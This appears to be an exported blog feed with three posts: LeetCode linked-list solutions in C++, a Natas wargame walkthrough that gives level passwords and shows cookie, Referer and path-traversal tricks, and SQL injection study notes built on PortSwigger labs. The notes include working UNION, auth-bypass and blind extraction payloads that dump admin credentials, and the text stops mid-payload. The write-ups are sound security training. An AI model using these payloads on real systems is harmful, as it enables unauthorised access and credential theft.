    <content type="html"><![CDATA[<h3 id="1-移除链表元素"><a href="#1-移除链表元素" class="headerlink" title="1. 移除链表元素"></a>1. 移除链表元素</h3><h4 id="203-移除链表元素"><a href="#203-移除链表元素" class="headerlink" title="203. 移除链表元素"></a><a href="https://leetcode-cn.com/problems/remove-linked-list-elements/">203. 移除链表元素</a></h4><p>给你一个链表的头节点 head 和一个整数 val ，请你删除链表中所有满足 Node.val &#x3D;&#x3D; val 的节点，并返回 新的头节点 。</p><p>示例 1：</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzidc8t9mhj20sq0883yz.jpg" alt="image-20220218212600659"></p><p>思路：比较简单，遍历链表，遇到val就删除。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++">ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置一个虚拟头结点</span><br>        dummyHead-&gt;next = head; <span class="hljs-comment">// 将虚拟头结点指向head，这样方面后面做删除操作</span><br>        ListNode* cur = dummyHead;<br>        <span class="hljs-keyword">while</span> (cur-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">if</span>(cur-&gt;next-&gt;val == val) &#123;<br>                ListNode* tmp = cur-&gt;next;<br>                cur-&gt;next = cur-&gt;next-&gt;next;<br>                <span class="hljs-keyword">delete</span> tmp;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                cur = cur-&gt;next;<br>            &#125;<br>        &#125;<br>        head = dummyHead-&gt;next;<br>        <span class="hljs-keyword">delete</span> dummyHead;<br>        <span class="hljs-keyword">return</span> head;<br></code></pre></td></tr></table></figure><h4 id="707-设计链表"><a href="#707-设计链表" class="headerlink" title="707. 设计链表"></a><a href="https://leetcode-cn.com/problems/design-linked-list/">707. 设计链表</a></h4><p>设计链表的实现。您可以选择使用单链表或双链表。单链表中的节点应该具有两个属性：val 和 next。val 是当前节点的值，next 是指向下一个节点的指针&#x2F;引用。如果要使用双向链表，则还需要一个属性 prev 以指示链表中的上一个节点。假设链表中的所有节点都是 0-index 的。</p><p>在链表类中实现这些功能：</p><pre><code class="hljs">get(index)：获取链表中第 index 个节点的值。如果索引无效，则返回-1。addAtHead(val)：在链表的第一个元素之前添加一个值为 val 的节点。插入后，新节点将成为链表的第一个节点。addAtTail(val)：将值为 val 的节点追加到链表的最后一个元素。addAtIndex(index,val)：在链表中的第 index 个节点之前添加值为 val  的节点。如果 index 等于链表的长度，则该节点将附加到链表的末尾。如果 index 大于链表长度，则不会插入节点。如果index小于0，则在头部插入节点。deleteAtIndex(index)：如果索引 index 有效，则删除链表中的第 index 个节点。</code></pre><h3 id="2-反转链表"><a href="#2-反转链表" class="headerlink" title="2. 反转链表"></a>2. 反转链表</h3><h4 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206. 反转链表"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list/">206. 反转链表</a></h4><p>给你单链表的头节点 <code>head</code> ，请你反转链表，并返回反转后的链表。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1gzjm2xfv55j21180ioab7.jpg" alt="image-20220219231355339"></p><p>思路：为节省空间，不用重新生成链表，只要将节点之间的指向关系反向即可。 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* cur = head;<br>        ListNode* pre = <span class="hljs-literal">nullptr</span>;<br>        ListNode* tmp;<br>        <span class="hljs-keyword">while</span>(cur) &#123;<br>            tmp = cur-&gt;next;<br>            cur-&gt;next = pre;<br>            pre = cur;<br>            cur = tmp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> pre;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="3-两两交换链表中的节点"><a href="#3-两两交换链表中的节点" class="headerlink" title="3. 两两交换链表中的节点"></a>3. 两两交换链表中的节点</h3><h4 id="24-两两交换链表中的节点"><a href="#24-两两交换链表中的节点" class="headerlink" title="24. 两两交换链表中的节点"></a><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/">24. 两两交换链表中的节点</a></h4><p>给你一个链表，两两交换其中相邻的节点，并返回交换后链表的头节点。你必须在不修改节点内部的值的情况下完成本题（即，只能进行节点交换）。<br><img src="https://code-thinking.cdn.bcebos.com/pics/24.%E4%B8%A4%E4%B8%A4%E4%BA%A4%E6%8D%A2%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9-%E9%A2%98%E6%84%8F.jpg" alt="example" style="zoom: 50%;" /></p>]]></content>
    
    
    
    <tags>
      
      <tag>Leetcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wargame Natas</title>
    <link href="/2022/02/10/2022-2-10-Wargame-Natas/"/>
    <url>/2022/02/10/2022-2-10-Wargame-Natas/</url>
    
    <content type="html"><![CDATA[<p>今天开始学习第二个wargame Natas。</p><p>Natas teaches the basics of serverside web-security.</p><p>Each level of natas consists of its own website located at <strong><a href="http://natasx.natas.labs.overthewire.org/">http://natasX.natas.labs.overthewire.org</a></strong>, where X is the level number. There is <strong>no SSH login</strong>. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.</p><p>Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. <strong>All passwords are also stored in &#x2F;etc&#x2F;natas_webpass&#x2F;</strong>. E.g. the password for natas5 is stored in the file &#x2F;etc&#x2F;natas_webpass&#x2F;natas5 and only readable by natas4 and natas5.</p><p>Start here:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span> natas0<br><span class="hljs-symbol">Password:</span> natas0<br><span class="hljs-symbol">URL:</span>      http://natas0.natas.labs.overthewire<span class="hljs-meta">.org</span><br></code></pre></td></tr></table></figure><p>这个游戏不再是ssh连接远程服务器来进行了，而是在网页上进行。打开网页看看是什么样先。</p><h4 id="Level-0-gt-1"><a href="#Level-0-gt-1" class="headerlink" title="Level 0 &gt; 1"></a>Level 0 &gt; 1</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz8wzsh0zcj312u0fggmj.jpg" alt="image-20220210171019481"></p><p>打开后是一个很简单的网站，写着密码就在这一页。习惯性用DevTool看一下，找到了在注释中的key：gtVrDuiDfck831PqWsLEZy5gyDz1clto</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz8x1h6q7lj30t005swf6.jpg" alt="image-20220210171200170"></p><h4 id="Level-1-gt-2"><a href="#Level-1-gt-2" class="headerlink" title="Level 1 &gt; 2"></a>Level 1 &gt; 2</h4><p>这一关的提示为右键已经被禁止。点一下右键会出现以下提示：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz8x6374ijj30p007amxg.jpg" alt="image-20220210171625511"></p><p>这可难不倒我们，直接一个F12就可以轻松找到key：ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz8x6zl9y2j30tg06mdgn.jpg" alt="image-20220210171717153"></p><h4 id="Level-2-gt-3"><a href="#Level-2-gt-3" class="headerlink" title="Level 2 &gt; 3"></a>Level 2 &gt; 3</h4><p>这一关的说明为：这个页面上什么都没有。查看html代码后发现key确实不在网页中了。但是可以看到在说明旁边有一个图片，只不过渲染大小为1*1像素，所以正常情况下看不到。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz8xe2kz3pj30qi0ceta8.jpg" alt="image-20220210172405681"></p><p>观察此图片的来源，可以看到此网站还有files网页，尝试进入后找到一个<code>users.txt</code>，内容如下。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta"># username:password</span><br><span class="hljs-symbol">alice:</span>BYNdCesZqW<br><span class="hljs-symbol">bob:</span>jw2ueICLvT<br><span class="hljs-symbol">charlie:</span>G5vCxkVV3m<br><span class="hljs-symbol">natas3:</span>sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14<br><span class="hljs-symbol">eve:</span>zo4mJWyNj2<br><span class="hljs-symbol">mallory:</span><span class="hljs-number">9</span>urtcpzBmH<br></code></pre></td></tr></table></figure><p>Key: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</p><h4 id="Level-3-gt-4"><a href="#Level-3-gt-4" class="headerlink" title="Level 3 &gt; 4"></a>Level 3 &gt; 4</h4><p>这一题的提示仍然是网页上什么都没有，但是有一个提示。</p><p><code>&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;</code></p><p>不能用Google搜索到其实是一个附加信息。现在的网站大多有相关是否允许爬虫的设置，通常存放在robots.txt中，所以我们找一下有没有这个文件。输入后得到以下信息。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">User-agent: *<br>Disallow: <span class="hljs-regexp">/s3cr3t/</span><br></code></pre></td></tr></table></figure><p>查阅<a href="https://robot-txt.com/sem-glossary/a-guide-to-robot-txt-files/?gclid=Cj0KCQiAjJOQBhCkARIsAEKMtO2POL91mPRQJiY7pzygDjt58ul4z7XaLzXk4yN2L83-LlisgdRg-GsaAgsrEALw_wcB">相关文档</a>，上面两行的意思是屏蔽除了第二行子文件夹之外的爬虫，所以我们打开此文件夹。</p><p><code>http://natas3.natas.labs.overthewire.org//s3cr3t/</code></p><p>得到user.txt，同时得到key：Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</p><h4 id="Level-4-gt-5"><a href="#Level-4-gt-5" class="headerlink" title="Level 4 &gt; 5"></a>Level 4 &gt; 5</h4><p>这一题是说只有从指定网站的访问才可以，页面上有一个刷新的按钮，按一下就会检测是从哪里访问的，突破口应该就在这里。使用Burp截取请求即可发现有一个Referer表名从哪里来的请求，将其改为要求的网址即可。</p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz8yh7qvv1j30mc0g6q5n.jpg" alt="image-20220210180141294" style="zoom:50%;" /><p>得到key：iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</p><h4 id="Level-5-gt-6"><a href="#Level-5-gt-6" class="headerlink" title="Level 5 &gt; 6"></a>Level 5 &gt; 6</h4><p>打开网页后提示拒绝访问，未登录。既然是登录问题，就可以抓请求看一下cookie设置。用Burp看到</p><p><code>Cookie: loggedin=0</code></p><p>将其值设置为1后发送，即可得到key：aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</p><h4 id="Level-6-gt-7"><a href="#Level-6-gt-7" class="headerlink" title="Level 6 &gt; 7"></a>Level 6 &gt; 7</h4><p>这一题需要我们输入一个秘密来获得key。旁边还有一个链接查看源码，点开看一下发现是网页源码，其中就包括了判断秘密的逻辑。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;includes/secret.inc&quot;</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">&quot;submit&quot;</span>, <span class="hljs-variable">$_POST</span>)) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$secret</span> == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Wrong secret&quot;</span>;<br>    &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到这里include了一个文件，里面应该就是秘密的内容，访问这个文件得到<code>$secret = &quot;FOEIUWGHFEEUHOFUOIU&quot;;</code>，输入即可得到key：7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</p><h4 id="Level-7-gt-8"><a href="#Level-7-gt-8" class="headerlink" title="Level 7 &gt; 8"></a>Level 7 &gt; 8</h4><p>进入网页后可以看到源码中有一条提示：hint: password for webuser natas8 is in &#x2F;etc&#x2F;natas_webpass&#x2F;natas8。网站上有两个链接，分别是主页和关于页，其url为?page&#x3D;home，利用此形式打开key文件。直接将home替换为上面的地址后输出了错误信息：</p><p><strong>Warning</strong>: include(&#x2F;etc&#x2F;natas_pass&#x2F;natas8): failed to open stream: Permission denied in <strong>&#x2F;var&#x2F;www&#x2F;natas&#x2F;natas7&#x2F;index.php</strong> on line <strong>21</strong></p><p>说明需要先回到根目录才行。在地址前增加5个..&#x2F;后，得到key：DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</p><h4 id="Level-8-gt-9"><a href="#Level-8-gt-9" class="headerlink" title="Level 8 &gt; 9"></a>Level 8 &gt; 9</h4><p>这一题又是需要输入秘密来获得key，同样也有查看源代码的选项。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><br><span class="hljs-variable">$encodedSecret</span> = <span class="hljs-string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encodeSecret</span>(<span class="hljs-params"><span class="hljs-variable">$secret</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$secret</span>)));<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">&quot;submit&quot;</span>, <span class="hljs-variable">$_POST</span>)) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">encodeSecret</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]) == <span class="hljs-variable">$encodedSecret</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Wrong secret&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这一段代码是说，编码后的秘密已经给出，我们的输入会先base64加密后反向最后转为16进制。我们只需要逆序执行这些操作即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>secret = <span class="hljs-string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span><br>secret = <span class="hljs-built_in">bytes</span>.fromhex(secret)<br>secret = secret[::-<span class="hljs-number">1</span>]<br>secret = base64.decodebytes(secret)<br><br><span class="hljs-built_in">print</span>(secret)<br><br><span class="hljs-comment"># Result = oubWYf2kBq</span><br></code></pre></td></tr></table></figure><p>最终获得key：W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security learning</tag>
      
      <tag>Wargame</tag>
      
      <tag>OverTheWire</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL 注入攻击</title>
    <link href="/2022/02/07/2022-02-01-SQL-Injetction%201%201/"/>
    <url>/2022/02/07/2022-02-01-SQL-Injetction%201%201/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Source: <a href="https://portswigger.net/web-security/sql-injection">https://portswigger.net/web-security/sql-injection</a></p><p>Cheatsheet: <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p></blockquote><h2 id="1-What-is-SQL-Injection"><a href="#1-What-is-SQL-Injection" class="headerlink" title="1. What is SQL Injection?"></a>1. What is SQL Injection?</h2><p>A <strong>web vulnerability</strong> that allows an attaker to interfere with the queries that an application makes to its database. Allow attakers to view data that they are not normally able to see. In some cases, SQL injection can be escalated to compromise underlying server or DoS attack.</p><h4 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h4><ul><li>Leakage of unauthorised data.</li><li>Persistant backdoor.</li></ul><h2 id="2-Examples"><a href="#2-Examples" class="headerlink" title="2. Examples"></a>2. Examples</h2><h3 id="1-Retrieving-hidden-data"><a href="#1-Retrieving-hidden-data" class="headerlink" title="1. Retrieving hidden data"></a>1. Retrieving hidden data</h3><ul><li>– is a comment indicator in SQL, anything after will be interpreted as comment.</li><li>Use <code>&#39;</code> to break the SQL command and add the injection.</li><li>Types of injections:<ul><li>OR 1&#x3D;1: return all data.</li></ul></li></ul><h3 id="2-Subverting-application-logic"><a href="#2-Subverting-application-logic" class="headerlink" title="2. Subverting application logic"></a>2. Subverting application logic</h3><p>Scenario: user login with username and password. </p><p><code>SELECT * FROM users WHERE username = &#39;wiener&#39; AND password = &#39;bluecheese&#39;</code></p><p>The goal is to hack in without knowing password, the method is to use the comment indicator to remove the password check, for example by entering username as <code>admin&#39;--</code>. The logic will be subverted by remove the <code>WHERE</code> clause. </p><h3 id="3-Retrieving-data-from-another-database"><a href="#3-Retrieving-data-from-another-database" class="headerlink" title="3. Retrieving data from another database"></a>3. Retrieving data from another database</h3><p>Use <code>UNION</code> key word to make additional queries that are appended on the original query. For example:</p><p><code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2</code></p><p>Key requirements:</p><ol><li>Each query must return the same number of columns.</li><li>The data types in each column must be compatible. (Same type for each column)</li></ol><p>So that in order to carry out a UNION attack, I need to figure out: </p><h4 id="How-many-columns-are-required-in-the-attack"><a href="#How-many-columns-are-required-in-the-attack" class="headerlink" title="How many columns are required in the attack"></a>How many columns are required in the attack</h4><ol><li>Injecting a series of <code>&#39;ORDER BY num--</code>clauses until an error occurs.  This means to order the results by different columns, if the number exceeds the column number, there might be error messages or detectable difference.</li><li>Submitting a series of <code>UNION SELECT NULL, NULL ...--</code>clauses. When matches, there will be an additional roll containing null values in each column. The reason using null is for compatibility. <ol><li>For Oracle database, there is a built-in table called <code>dual</code> which can be used in this attack: <code> UNION SELECT NULL FROM DUAL--</code></li><li>In MySQL, <code>--</code>must be followed by a space or simply use <code>#</code> as comment.</li></ol></li></ol><h4 id="Finding-columns-with-useful-data-type"><a href="#Finding-columns-with-useful-data-type" class="headerlink" title="Finding columns with useful data type"></a>Finding columns with useful data type</h4><p>To find which column has the desired data type, assume that there are 4 columns, you can submit:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; UNION SELECT &#x27;</span>a<span class="hljs-string">&#x27;,NULL,NULL,NULL--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span><span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; UNION SELECT NULL,NULL,&#x27;</span>a<span class="hljs-string">&#x27;,NULL--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>And you can judge the data type from the error message.</p><p>Now you know the number of columns and found which column has a string data, the next step is to get data you are interested in by <code>UNION</code> attack.</p><h3 id="4-Examining-the-database"><a href="#4-Examining-the-database" class="headerlink" title="4. Examining the database"></a>4. Examining the database</h3><p>It is generally useful to get more information from the database for further exploitation. Including version details, contents of the database.</p><h4 id="Get-database-type-and-version"><a href="#Get-database-type-and-version" class="headerlink" title="Get database type and version"></a>Get database type and version</h4><p>Because that different databases have different ways of querying version, you usually need to try all the possible ways to determine which one it is. (Use <code>&#39; UNION</code>)</p><table><thead><tr><th><strong>Database type</strong></th><th><strong>Query</strong></th></tr></thead><tbody><tr><td>Microsoft, MySQl</td><td><code>SELECT @@version</code></td></tr><tr><td>Oracle</td><td><code>Select banner FROM v$version</code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr></tbody></table><hr><p><strong><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle">Lab SQL injection, query the database type and version (Oracle)</a></strong></p><ol><li>Find how many columns are there in the table. Add <code>&#39;ORDER BY num&#39;</code> to the end of the url and find that there are two columns.</li><li>Find that the second column has the datatype sting.</li><li>Add the following query to return the banner of the database.</li></ol><p><code>&#39;UNION SELECT NULL, banner FROM v$version--</code></p><p>Result:</p> <img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyztugzf0pj30vg09cdgw.jpg" alt="image-20220202203119278" style="zoom:50%;" /><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft">Lab Query the database and version (MySQL and Microsoft)</a></p><ol><li>First, determine the number of columns of the returned table using <code>&#39;UNION SELECT NULL, NULL#</code>. Then we know that there are two columns.</li><li>Second, find the data type of these columns to see if they are string. By setting each <code>NULL</code> to <code>&#39;a&#39;</code>, two columns have the same data type of string, so we can use either to perform the SQL injection</li><li>Get the database version by the following query:<code>&#39;UNION SELECT @@version, NULL#</code></li></ol><p>Result: </p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzvkzwpt7j305003a3ya.jpg" alt="image-20220202213128309" style="zoom:50%;" /><h4 id="Listing-the-content-of-the-database"><a href="#Listing-the-content-of-the-database" class="headerlink" title="Listing the content of the database"></a>Listing the content of the database</h4><p>Most databases (except for Oracle) have views that provide information about the database. For example <code>information_schema</code> that contains the table names and column names for each table.</p><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">Lab SQL injection, listing the databases on non-Oracle databases</a></p><ol><li><p>首先还是通过NULL来决定表的每一列的数据类型。<code>&#39;UNION SELECT NULL, NULL--</code></p></li><li><p>然后查看<code>information_schema</code>中的表名都是什么。<code>&#39;+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code></p></li><li><p>找到一个user开头的表名，应该就是存放用户信息的，进一步看这个表中有哪些列。<code>&#39;+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=&#39;users_tsxwcv&#39;--</code></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6i4f319oj30by02kwec.jpg" alt="image-20220208150439802"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6i4pgcnqj30as03yt8m.jpg" alt="image-20220208150459170"></p></li><li><p>这样就找到了存放用户名和密码的列。再次请求得到admin的密码即可。<code>&#39;+UNION+SELECT+username_qvqafc,+password_zecjow+FROM+users_tsxwcv--</code></p></li></ol><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6i81e4t6j30fs04o3yi.jpg" alt="image-20220208150811298"></p><h4 id="在Oracle中的类似操作"><a href="#在Oracle中的类似操作" class="headerlink" title="在Oracle中的类似操作"></a>在Oracle中的类似操作</h4><p>在oracle中，只需要进行一些修改即可得到相同的数据。所有表的信息可以从<code>all_tables</code>获得，具体列名可以通过以下命令获得：</p><p><code>SELECT * FROM all_tab_columns WHERE table_name = &#39;USERS&#39;</code></p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle">Lab SQL injection attack, listing the database contents on Oracle</a></p></blockquote><p>由于Oracle数据库中的<code>SELECT</code>必须要和<code>FROM</code>配合出现，所以可以用<code>dual</code>表来进行占位。</p><ol><li>通过尝试，<code>&#39;UNION+SELECT+&#39;abc&#39;,+&#39;abc&#39;+FROM+dual--</code>成功，说明有当前表有两列且都是字符串类型。</li><li>查看有哪些表：<code>&#39;UNION+SELECT+table_name,+NULL+FROM+all_tables--</code>，找到了<strong>USERS_AHJNLZ</strong>这张表。</li><li>查看这张表中有哪些列：<code>&#39;UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name=&#39;USERS_AHJNLZ&#39;--</code>最终找到存放用户名和密码的列名为：PASSWORD_QAGOVT和USERNAME_WGWVWL</li><li>最后就可以找到admin的密码：<code>&#39;UNION SELECT USERNAME_WGWVWL, PASSWORD_QAGOVT FROM USERS_AHJNLZ--</code></li></ol><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6j89ft6oj30j20b0dg9.jpg" alt="image-20220208154259474"></p><h3 id="4-盲注（Blind-SQL-Injection"><a href="#4-盲注（Blind-SQL-Injection" class="headerlink" title="4. 盲注（Blind SQL Injection)"></a>4. 盲注（Blind SQL Injection)</h3><p>在很多情形下，SQL注入后不会显示错误信息甚至不会返回任何信息，例如应用有SQL漏洞，但是其HTTP回应不含相应注入的返回信息和数据库错误信息。常用的如UNION注入就不再适用了。这种blind漏洞仍然是可利用的，只不过更加复杂。常用的盲注方法有：</p><h4 id="1）触发条件应答盲注"><a href="#1）触发条件应答盲注" class="headerlink" title="1）触发条件应答盲注"></a>1）触发条件应答盲注</h4><p>例如在使用cookie登录时，服务器可能使用以下语句验证cookie：</p><p><code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = &#39;cookie&#39;</code></p><p>不同于之前的注入，不正确的cookie不会返回任何信息，但是正确的cookie会重定位到一个例如Welcome Back的页面，这样的行为就是一种条件应答，并且可以作为一个注入点。这样的注入如何进行呢？考虑下面两种cookie后的输入</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">…xyz&#x27; AND &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br>…xyz&#x27; AND &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>第一个请求会显示welcome back，而第二个请求因为条件恒为false会导致没有返回，也就不会显示welcome back，这样的差别就让我们可以判断请求的对错从而获取数据库内的相关信息。例如，假设数据库中有一个User表，其中有Username和Password列，其中存放着用户Administrator的信息，我们可以通过每次确定一个字符的方式获取其登录密码，如下所示：</p><p><code>xyz&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;Administrator&#39;), 1, 1) &gt; &#39;m</code></p><p>如果返回welcome页面，则可以确定其密码的第一个字符大于m。重复此步骤直到获得完整密码。</p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses">Lab: Blind SQL injection with conditional responses</a></p></blockquote><p>此lab的任务就是找到admin的密码，使用Burp查看一下页面请求发现了cookie：</p><p><code>Cookie: TrackingId=xrZbR12nPsEWP8FJ; session=BBFx677kQDfMJXYbCXWJFahUhthnZdK3</code></p><p>尝试再其后添加<code>AND &#39;1&#39;=&#39;1</code>，结果可以正常显示Welcome back，添加<code>AND &#39;1&#39;=&#39;2</code>后则不能正常显示，说明可以进行盲注。第二步就是逐步获得admin的密码。首先确定存在数据库，确定列名和admin的存在性。</p><p><code>&#39; AND (SELECT &#39;a&#39; FROM users LIMIT 1)=&#39;a</code></p><p>结果表明存在users表。</p><p><code>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39;)=&#39;a</code></p><p>结果表明存在username这一列，并且存在用户administrator。接下来，最好确定一下密码的长度。</p><p><code>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)&gt;2)=&#39;a</code></p><p>在repeater中不断修改长度，最终得到密码有20位，还是挺复杂的。接下来就可以尝试获取密码的具体值了。</p><p><code>&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE 